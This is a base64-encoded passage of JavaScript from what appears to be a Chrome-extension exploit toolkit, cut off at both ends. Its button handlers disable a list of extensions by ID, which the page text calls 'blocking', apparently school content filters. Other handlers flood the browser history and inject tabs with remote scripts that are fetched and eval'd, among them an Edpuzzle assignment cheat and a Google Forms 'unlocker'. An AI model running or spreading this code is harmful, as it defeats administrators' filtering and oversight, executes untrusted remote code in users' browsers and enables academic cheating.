AgICAgICAiaGFydG9vbHMuanMiLAogICAgICAgICAgICAgICAgYXdhaXQgZmV0Y2goCiAgICAgICAgICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9wYXlsb2Fkcy9pbmRleC5qcyIKICAgICAgICAgICAgICAgICkudGhlbigocmVzKSA9PiByZXMudGV4dCgpKQogICAgICAgICAgICApOwoKICAgICAgICAgICAgY2hyb21lLnRhYnMuY3JlYXRlKHsKICAgICAgICAgICAgICAgIHVybAogICAgICAgICAgICB9KTsKICAgICAgICB9KSgpOwogICAgfTsKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3F1aWNrLXJtdi1ibHQiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIChhc3luYyAoKSA9PiB7CgogICAgICAgICAgICBjb25zdCBmcyA9IGF3YWl0IG5ldyBQcm9taXNlKGZ1bmN0aW9uIChyZXNvbHZlKSB7CiAgICAgICAgICAgICAgICAgIHdlYmtpdFJlcXVlc3RGaWxlU3lzdGVtKFBFUlNJU1RFTlQsIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbiAod3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgY29uc3QgSlMgPSBgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBibG9hdElkcyA9IFsKICAgICAgICAgICAgICAgICAgICAgICJjZ2JiYmptZ2RwbmlmaWpjb25oYW1nZ2plaGxhbWNpZiIsCiAgICAgICAgICAgICAgICAgICAgICAibGZrYmJtY2xucGFpaHBhYWpob2hoZmRqZWxjaGtpa2YiLAogICAgICAgICAgICAgICAgICAgICAgIm5jYm9mbmhtbWZmZm1jZG1iamZhaWdlcGtnbWpubG5lIiwKICAgICAgICAgICAgICAgICAgICAgICJwb2htZ29iZGVhamVtY2lmcG9sZG5uaGZmam5ua2hnZiIsCiAgICAgICAgICAgICAgICAgICAgICAiYmVjZHBsZmFsb29mbGFuaXBqb2JsY21wYWVra2JiaGUiLAogICAgICAgICAgICAgICAgICAgICAgImZlZXBtZGxtaHBsYW9qYWJlb2VjYW9iZm1pYm9vYWlkIiwKICAgICAgICAgICAgICAgICAgICAgICJhZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbSIsCiAgICAgICAgICAgICAgICAgICAgICAiaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiLAogICAgICAgICAgICAgICAgICAgICAgImZpbGdwamtkbWppbm1qYmVwYnBtbmZvYm1qbWdpbW9uIiwKICAgICAgICAgICAgICAgICAgICAgICJra2JtZGdqZ2djZGFqY2tkbGJuZ2Rqb25wY2hwYWllYSIsCiAgICAgICAgICAgICAgICAgICAgICAibmpkbmljbGdlZ2lqZGNkbGlrbGdpZWljYW5wbWNuZ2oiLAogICAgICAgICAgICAgICAgICAgICAgImhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIgogICAgICAgICAgICAgICAgICAgIF07CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChpZCwgZmFsc2UpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jbG9zZSgpOwogICAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBhbGVydCgidW5zdWNjZXNzZnVsIik7CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgYDsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IGZpbGVOYW1lID0gImJsb2F0IjsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZShgJHtmaWxlTmFtZX0uaHRtbGAsYDwhZG9jdHlwZWh0bWw+PHRpdGxlPmRpc2FibGluZy4uPC90aXRsZT48bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUludGVyOml0YWwsb3Bzeix3Z2h0QDAsMTQuLjMyLDEwMC4uOTAwOzEsMTQuLjMyLDEwMC4uOTAwJmRpc3BsYXk9c3dhcCJyZWw9c3R5bGVzaGVldD48c3R5bGU+cHttYXJnaW46MH1ib2R5e2JhY2tncm91bmQtY29sb3I6IzAwMDtjb2xvcjojZmZmO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWY7bWFyZ2luOjA7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO2hlaWdodDoxMDB2aH1oMTo6YmVmb3Jle2NvbnRlbnQ6IiMgIjtjb2xvcjpva2xjaCg4MS4yMSUgLjE0MDkgMTY1LjE0KTtmb250LXdlaWdodDo5MDB9LmlubmVye2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7dGV4dC1hbGlnbjpjZW50ZXJ9dGV4dGFyZWF7d2lkdGg6bWF4LWNvbnRlbnQ7cGFkZGluZy10b3A6MWVtO292ZXJmbG93LXk6aGlkZGVuO2JvcmRlci1yYWRpdXM6MTBweDtiYWNrZ3JvdW5kOm9rbGNoKDE3LjAzJSAuMDA4MyAyODUuNDkgLyAuNSk7Ym9yZGVyOjFweCBzb2xpZCBva2xjaCg2OC42NSUgLjAzNzQgMjc0LjczIC8gLjUpO2NvbG9yOm9rbGNoKDk1LjkyJSAuMDE5MjUzIDI3My4yMzc3KTtyZXNpemU6bm9uZTtmb250LWZhbWlseTptb25vc3BhY2U7dHJhbnNpdGlvbjphbGwgLjVzIGN1YmljLWJlemllciguMTc1LC44ODUsLjMyLDEuOSksY29sb3IgLjI1cyxib3JkZXItY29sb3IgLjI1c308L3N0eWxlPjxkaXYgY2xhc3M9aW5uZXI+PHRleHRhcmVhIGNvbHM9MTIgcmVhZG9ubHkgcm93cz0yPiAgKF5fX19fXik8L3RleHRhcmVhPjxoMT5kaXNhYmxpbmcuLi48L2gxPjxwPmhhcHB5IGRheXMgIHdpdGhvdXQgYmxvY2tpbmcgYW0gaSByaWdodD88L2Rpdj48c2NyaXB0IHNyYz0uLyR7ZmlsZU5hbWV9LmpzPjwvc2NyaXB0PmApOwogICAgICAgICAgICAKICAgICAgICAgICAgYXdhaXQgd3JpdGVGaWxlKGAke2ZpbGVOYW1lfS5qc2AsIEpTKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNocm9tZS50YWJzLmNyZWF0ZSh7IHVybCB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pKCk7CiAgICB9OwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI2hzdGZsZCIpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgZG9jdW1lbnQudGl0bGUgPSAiVW50aXRsZWQgZG9jdW1lbnQiOwogICAgICAgIGxldCBsaW5rID0KICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcigibGlua1tyZWx+PSdpY29uJ10iKSB8fAogICAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7CiAgICAgICAgbGluay5yZWwgPSAiaWNvbiI7CiAgICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChsaW5rKTsKICAgICAgICBsaW5rLmhyZWYgPQogICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluLyI7CgogICAgICAgIGxldCBudW0gPSBwcm9tcHQoCiAgICAgICAgICAgICJIb3cgVGltZXMgRG8gWW91IFdhbnQgVGhpcyBQYWdlIFRvIFNob3cgVXAgSW4geW91ciBIaXN0b3J5PyIKICAgICAgICApOwogICAgICAgIGxldCBkb25lID0gZmFsc2U7CiAgICAgICAgY29uc3QgeCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmOwogICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDw9IG51bTsgaSsrKSB7CiAgICAgICAgICAgIGhpc3RvcnkucHVzaFN0YXRlKDAsIDAsIGkgPT09IG51bSA/IHggOiBpLnRvU3RyaW5nKCkpOwogICAgICAgICAgICBpZiAoaSA9PT0gbnVtKSBkb25lID0gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgaWYgKGRvbmUpIHsKICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAiRmxvb2RpbmcgU3VjY2Vzc2Z1bCFcbiAiICsKICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmICsKICAgICAgICAgICAgICAgICIgXG5JcyBOb3cgSW4gWW91ciBIaXN0b3J5ICIgKwogICAgICAgICAgICAgICAgbnVtICsKICAgICAgICAgICAgICAgIChudW0gPT0gMSA/ICIgdGltZS4iIDogIiBUaW1lcy4iKQogICAgICAgICAgICApOwogICAgICAgIH0KICAgIH07CgogICAgY29uc3QgVGFiQnV0dG9ucyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiN0YWJzLWJ1dHRvbnMiKTsKCiAgICBpZiAoY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCkgewoKICAgICAgICBmdW5jdGlvbiBsaXN0ZW5lckFwcChjYWxsYmFjaykgewogICAgICAgICAgICBjb25zdCBmdW5jID0gKGlkLCBjaGFuZ2VJbmZvKSA9PiB7CiAgICAgICAgICAgICAgICBpZiAoY2hhbmdlSW5mby5zdGF0dXMgPT09ICJjb21wbGV0ZSIpIHsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5nZXQoaWQsICh0YWIpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHRhYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2sodGFiKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwogICAgICAgICAgICBjaHJvbWUudGFicy5vblVwZGF0ZWQuYWRkTGlzdGVuZXIoZnVuYyk7CiAgICAgICAgICAgIHJldHVybiBmdW5jOwogICAgICAgIH0KCiAgICAgICAgY29uc3Qgc2NyaXB0cyA9IHt9OwogICAgICAgIGNvbnN0IGNvbmRpdGlvbnMgPSB7fTsKICAgICAgICBjb25zdCBsaXN0ZW5lcnMgPSB7fTsKCiAgICAgICAgc2NyaXB0cy5lcnVkYSA9IGAKICAgIGZldGNoKCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2VydWRhIikudGhlbihyZXMgPT4gcmVzLnRleHQoKSkudGhlbigoZGF0YSkgPT4gewogICAgICBldmFsKGRhdGEpOwogICAgICBpZiAoIXdpbmRvdy5lcnVkYUxvYWRlZCkgewogICAgICAgIGVydWRhLmluaXQoewogICAgICAgICAgZGVmYXVsdHM6IHsKICAgICAgICAgICAgZGlzcGxheVNpemU6IDQ1LAogICAgICAgICAgICB0aGVtZTogIkFNT0xFRCIKICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICB3aW5kb3cuZXJ1ZGFMb2FkZWQgPSB0cnVlOwogICAgICB9CiAgICB9KTsKICBgOwoKICAgICAgICBzY3JpcHRzLmNoaWkgPSBgCiAgICBjb25zdCBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgIHNjcmlwdC5zcmMgPSAnaHR0cHM6Ly9jaGlpLmxpcmlsaXJpLmlvL3BsYXlncm91bmQvdGFyZ2V0LmpzJzsKICAgIHNjcmlwdC5zZXRBdHRyaWJ1dGUoJ2VtYmVkZGVkJywgJ3RydWUnKTsKICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKICBgOwoKICAgICAgICBzY3JpcHRzLmFkYmxvY2sgPSBgCiAgICAoZnVuY3Rpb24oKXsKCiAgICAgIHZhciBzZWxlY3RvcnMgPSBbCgogICAgICAnI3NpZGViYXItd3JhcCcsICcjYWR2ZXJ0JywgJyN4cmFpbCcsICcjbWlkZGxlLWFydGljbGUtYWR2ZXJ0LWNvbnRhaW5lcicsCiAgICAgICcjc3BvbnNvcmVkLXJlY29tbWVuZGF0aW9ucycsICcjYXJvdW5kLXRoZS13ZWInLCAnI3Nwb25zb3JlZC1yZWNvbW1lbmRhdGlvbnMnLAogICAgICAnI3RhYm9vbGEtY29udGVudCcsICcjdGFib29sYS1iZWxvdy10YWJvb2xhLW5hdGl2ZS10aHVtYm5haWxzJywgJyNpbmFydGljbGVfd3JhcHBlcl9kaXYnLAogICAgICAnI3JjLXJvdy1jb250YWluZXInLCAnI2FkcycsICcjYXQtc2hhcmUtZG9jaycsICcjYXQ0LXNoYXJlJywgJyNhdDQtZm9sbG93JywgJyNyaWdodC1hZHMtcmFpbCcsCiAgICAgICdkaXYjYWQtaW50ZXJzdGl0aWFsJywgJ2RpdiNhZHZlcnQtYXJ0aWNsZScsICdkaXYjYWMtbHJlLXBsYXllci1waCcsCgogICAgICAnLmFkJywgJy5hdmVydCcsICcuYXZlcnRfX3dyYXBwZXInLCAnLm1pZGRsZS1iYW5uZXItYWQnLCAnLmFkdmVydGlzZW1lbnQnLAogICAgICAnLkdvb2dsZUFjdGl2ZVZpZXdDbGFzcycsICcuYWR2ZXJ0JywgJy5jbnMtYWRzLXN0YWdlJywgJy50ZWFkcy1pbnJlYWQnLCAnLmFkLWJhbm5lcicsCiAgICAgICcuYWQtYW5jaG9yZWQnLCAnLmpzX3NoZWxmX2FkcycsICcuYWQtc2xvdCcsICcuYW50ZW5uYScsICcueHJhaWwtY29udGVudCcsCiAgICAgICcuYWR2ZXJ0aXNlbWVudF9fbGVhZGVyYm9hcmQnLCAnLmFkLWxlYWRlcmJvYXJkJywgJy50cmNfcmJveF9vdXRlcicsICcua3MtcmVjb21tZW5kZWQnLAogICAgICAnLmFydGljbGUtZGEnLCAnZGl2LnNwb25zb3JlZC1zdG9yaWVzLWNvbXBvbmVudCcsICdkaXYuYWRkdGhpcy1zbWFydGxheWVycycsCiAgICAgICdkaXYuYXJ0aWNsZS1hZHNwb25zb3InLCAnZGl2LnNpZ25pbi1wcm9tcHQnLCAnZGl2LmFydGljbGUtYnVtcGVyJywgJ2Rpdi52aWRlby1wbGFjZWhvbGRlcicsCiAgICAgICdkaXYudG9wLWFkLWNvbnRhaW5lcicsICdkaXYuaGVhZGVyLWFkJywgJ2Rpdi5hZC11bml0JywgJ2Rpdi5kZW1vLWJsb2NrJywgJ2Rpdi5PVVRCUkFJTicsCiAgICAgICdkaXYub2Itd2lkZ2V0JywgJ2Rpdi5ud3NybS13cmFwcGVyJywgJ2Rpdi5hbm5vdW5jZW1lbnRCYXInLCAnZGl2LnBhcnRuZXItcmVzb3VyY2VzLWJsb2NrJywKICAgICAgJ2Rpdi5hcnJvdy1kb3duJywgJ2Rpdi5tLWFkJywgJ2Rpdi5zdG9yeS1pbnRlcnJ1cHQnLCAnZGl2LnRhYm9vbGEtcmVjb21tZW5kZWQnLAogICAgICAnZGl2LmFkLWNsdXN0ZXItY29udGFpbmVyJywgJ2Rpdi5jdHgtc2lkZWJhcicsICdkaXYuaW5jb2duaXRvLW1vZGFsJywgJy5PVVRCUkFJTicsICcuc3Vic2NyaWJlLWJ1dHRvbicsCiAgICAgICcuYWRzOScsICcubGVhZGVyYm9hcmRzJywgJy5Hb29nbGVBY3RpdmVWaWV3RWxlbWVudCcsICcubXB1LWNvbnRhaW5lcicsICcuYWQtMzAweDYwMCcsICcudGYtYWQtYmxvY2snLAogICAgICAnLnNpZGViYXItYWRzLWhvbGRlci10b3AnLCAnLmFkcy1vbmUnLCAnLkZ1bGxQYWdlTW9kYWxfX3Njcm9sbGVyJywKICAgICAgJy5jb250ZW50LWFkcy1ob2xkZXInLCAnLndpZGdldC1hcmVhJywgJy5zb2NpYWwtYnV0dG9ucycsICcuYWMtcGxheWVyLXBoJywKCiAgICAgICdhc2lkZSNzcG9uc29yZWQtcmVjb21tZW5kYXRpb25zJywgJ2FzaWRlW3JvbGU9ImJhbm5lciJdJywgJ2FzaWRlJywKICAgICAgJ2FtcC1hZCcsICdzcGFuW2lkXj1hZF9pc19dJywgJ2RpdltjbGFzcyo9ImluZGlhbmFwb2xpcy1vcHRpbiJdJywgJ2RpdltpZF49Z29vZ2xlX2Fkc19pZnJhbWVdJywKICAgICAgJ2RpdltkYXRhLWdvb2dsZS1xdWVyeS1pZF0nLCAnc2VjdGlvbltkYXRhLXJlc3BvbnNlXScsICdpbnMuYWRzYnlnb29nbGUnLCAnZGl2W2RhdGEtZ29vZ2xlLXF1ZXJ5LWlkXScsCiAgICAgICdkaXZbZGF0YS10ZXN0LWlkPSJmdWxsUGFnZVNpZ251cE1vZGFsIl0nLCAnZGl2W2RhdGEtdGVzdC1pZD0iZ2lmdFdyYXAiXScgXTsKICAgICAgZm9yKGxldCBpIGluIHNlbGVjdG9ycykgewogICAgICAgICAgbGV0IG5vZGVzTGlzdCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoc2VsZWN0b3JzW2ldKTsKICAgICAgICAgIGZvcihsZXQgaSA9IDA7IGkgPCBub2Rlc0xpc3QubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICBsZXQgZWwgPSBub2Rlc0xpc3RbaV07CiAgICAgICAgICAgICAgaWYoZWwgJiYgZWwucGFyZW50Tm9kZSkKICAgICAgICAgICAgICBlbC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGVsKTsKICAgICAgICAgIH0KICAgICAgfQogICAgfSkoKTsKICBgOwogIC8qc2NyaXB0cy5nbG9ja2VkID0gYApmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hOYXN1bmkvZ29vZ2xlLWZvcm1zLXVubG9ja2VyL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHQuanMiKQogIC50aGVuKHJlc3BvbnNlID0+IHsKICAgIGlmICghcmVzcG9uc2Uub2spIHsKICAgICAgdGhyb3cgbmV3IEVycm9yKCJOZXR3b3JrIHJlc3BvbnNlIHdhcyBub3Qgb2siKTsKICAgIH0KICAgIHJldHVybiByZXNwb25zZS50ZXh0KCk7CiAgfSkKICAudGhlbihzY3JpcHRDb250ZW50ID0+IHsKICAgIGlmICghd2luZG93LnNraWJMb2FkZWQpIHsKICAgICAgZXZhbChzY3JpcHRDb250ZW50KTsKICAgICAgd2luZG93LnNraWJMb2FkZWQgPSB0cnVlOwogICAgfQogIH0pCiAgLmNhdGNoKGVycm9yID0+IGFsZXJ0KCJFcnJvciBsb2FkaW5nIHNjcmlwdDoiLCBlcnJvcikpOwpgOwoqLwogICAgICAgIHNjcmlwdHMuZWRwdXp6bGUgPSBgCiAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL01pbmVyNDl1ci9zaG9ydGhhbmRAbWFpbi9lZHB1enpsaW5nc2NyaXB0LmpzIikudGhlbihyID0+IHIudGV4dCgpKS50aGVuKHIgPT4gewogICAgICBpZiAoIXdpbmRvdy5lZHB1enpsZXNMb2FkZWQpIHsKICAgICAgICBldmFsKHIpOwogICAgICAgIHdpbmRvdy5lZHB1enpsZXNMb2FkZWQgPSB0cnVlOwogICAgICB9CiAgICB9KTsKICBgOwogICAgICAgIGNvbmRpdGlvbnMuZWRwdXp6bGUgPSAodGFiKSA9PiB0YWIudXJsLm1hdGNoKC9lZHB1enpsZVwuY29tXC9hc3NpZ25tZW50cy9nKTsKICAgICAgICAvLyBjb25kaXRpb25zLmdsb2NrZWQgPSAodGFiKSA9PiB0YWIudXJsLm1hdGNoKC9odHRwcz86XC9cL2RvY3NcLmdvb2dsZVwuY29tXC9mb3Jtc1wvL2cpOwogICAgICAgIGNvbnN0IFRvZ2dsZUJ1dHRvbnMgPSBUYWJCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVhYmxlLWJ1dHRvbnMiKTsKCiAgICAgICAgVG9nZ2xlQnV0dG9ucy5xdWVyeVNlbGVjdG9yQWxsKCJidXR0b24iKS5mb3JFYWNoKAogICAgICAgICAgICAoYikgPT4KICAgICAgICAgICAgKGIub25jbGljayA9ICgpID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IGlkID0gYi5pZDsKCiAgICAgICAgICAgICAgICBpZiAoYi5oYXNBdHRyaWJ1dGUoInRvZ2dsZWQiKSkgewoKICAgICAgICAgICAgICAgICAgICBpZiAoaWQgaW4gbGlzdGVuZXJzKQogICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5vblVwZGF0ZWQucmVtb3ZlTGlzdGVuZXIobGlzdGVuZXJzW2lkXSk7CiAgICAgICAgICAgICAgICAgICAgYi5yZW1vdmVBdHRyaWJ1dGUoInRvZ2dsZWQiKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNjcmlwdCA9IHNjcmlwdHNbaWRdIHx8ICIiOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGNvbmRpdGlvbiA9IGNvbmRpdGlvbnNbaWRdIHx8ICgodGFiKSA9PiB0cnVlKTsKICAgICAgICAgICAgICAgICAgICBjb25zdCBmdW5jID0gbGlzdGVuZXJBcHAoKHRhYikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29uZGl0aW9uKHRhYikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQodGFiLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29kZTogc2NyaXB0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICBsaXN0ZW5lcnNbaWRdID0gZnVuYzsKCiAgICAgICAgICAgICAgICAgICAgYi5zZXRBdHRyaWJ1dGUoInRvZ2dsZWQiLCAidHJ1ZSIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KQogICAgICAgICk7CiAgICB9IGVsc2UgewogICAgICAgIFRhYkJ1dHRvbnMuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0KCiAgICBkb2N1bWVudAogICAgICAgIC5xdWVyeVNlbGVjdG9yKCIjY29kZS1ydW4iKQogICAgICAgIC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHJ1bkNvZGUoZmFsc2UpKTsKfTsKCmNvbnN0IHJ1bkNvZGUgPSBhc3luYyAob25UYWIsIHRhYklkID0gIiIpID0+IHsKICAgIGNvbnN0IGNvZGVUZXh0YXJlYSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlIik7CiAgICBsZXQgY29kZSA9IGNvZGVUZXh0YXJlYS52YWx1ZS50cmltKCk7CgogICAgY29uc3Qgb3V0cHV0RGl2ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2NvZGUtb3V0cHV0Iik7CgogICAgaWYgKGNvZGUudG9Mb3dlckNhc2UoKSA9PT0gInByYWhpdCIpIHsKCiAgICAgICAgY29uc3QgY29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgY29udGFpbmVyLmNsYXNzTmFtZSA9ICJwcmFoaXQtY29udGFpbmVyIjsKCiAgICAgICAgY29uc3Qgb3ZlcmxheUltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICAgICAgb3ZlcmxheUltYWdlLnNyYyA9CiAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvcHJhaGl0LnBuZyI7CiAgICAgICAgb3ZlcmxheUltYWdlLmFsdCA9ICJQcmFoaXQgSW1hZ2UiOwogICAgICAgIG92ZXJsYXlJbWFnZS5jbGFzc05hbWUgPSAicHJhaGl0LWltYWdlIjsKCiAgICAgICAgY29uc3QgdGV4dEJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRleHRCb3gudGV4dENvbnRlbnQgPSAiXCJJIG1hZGUgbXkgb3duIG9pbCByaWdnaW5nIHN0b2NrIG1hcmtldCB0b29scy5cIiI7CiAgICAgICAgdGV4dEJveC5jbGFzc05hbWUgPSAicHJhaGl0LXRleHRib3giOwoKICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQob3ZlcmxheUltYWdlKTsKICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dEJveCk7CgogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGFpbmVyKTsKCiAgICAgICAgY29uc3Qgc25vd2ZsYWtlc0RpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHNub3dmbGFrZXNEaXYuY2xhc3NOYW1lID0gInNub3dmbGFrZXMiOwogICAgICAgIHNub3dmbGFrZXNEaXYuc2V0QXR0cmlidXRlKCJhcmlhLWhpZGRlbiIsICJ0cnVlIik7CgogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgMTQ7IGkrKykgewogICAgICAgICAgICBjb25zdCBzbm93Zmxha2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICAgICAgc25vd2ZsYWtlLmNsYXNzTmFtZSA9ICJzbm93Zmxha2UiOwoKICAgICAgICAgICAgY29uc3Qgc25vd2ZsYWtlSW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgICAgICAgICAgc25vd2ZsYWtlSW1hZ2Uud2lkdGggPSAzMDsKICAgICAgICAgICAgc25vd2ZsYWtlSW1hZ2Uuc3JjID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90M20xbjRsL3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2ltZy9wcmFoaXQucG5nIjsKICAgICAgICAgICAgc25vd2ZsYWtlLmFwcGVuZENoaWxkKHNub3dmbGFrZUltYWdlKTsKCiAgICAgICAgICAgIHNub3dmbGFrZXNEaXYuYXBwZW5kQ2hpbGQoc25vd2ZsYWtlKTsKICAgICAgICB9CgogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc25vd2ZsYWtlc0Rpdik7CgogICAgICAgIGNvbnN0IGV4cGxvc2lvbkltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3JjID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90M20xbjRsL3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2ltZy9ib29tLmF3ZWJwIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAg